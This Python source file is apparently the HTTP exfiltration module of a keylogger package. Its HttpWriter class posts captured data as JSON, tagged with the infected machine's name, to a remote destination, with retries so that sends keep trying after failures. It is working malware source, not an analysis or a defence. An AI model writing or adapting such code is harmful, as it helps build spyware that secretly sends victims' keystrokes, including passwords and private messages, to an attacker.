from typing import Any, Dict
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from keylogger.writers.base import IWriter



RETRIES: int = 3
BACKOFF_FACTOR: float = 0.3




class HttpWriter(IWriter):

    def __init__(self, destination, timeout: float = 10.0) -> None:
        super().__init__(destination)

        self.__timeout = timeout

        self.session = requests.Session()

        status_forcelist = (429, 500, 502, 503, 504)
        retry = Retry(
            total=RETRIES,
            read=RETRIES,
            connect=RETRIES,
            backoff_factor=BACKOFF_FACTOR,
            status_forcelist=status_forcelist,
            allowed_methods={"POST"},
            raise_on_status=False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)


    def send_data(self, data: Dict[str, Any], machine_name: str):
        req_headers = {"X-Machine-Name": machine_name}
        try:
            resp = self.session.post(
                self._destination,
                json=data,
                headers=req_headers,
                timeout=self.__timeout,
            )

            return resp.status_code
        except requests.exceptions.RequestException as e:
            return None


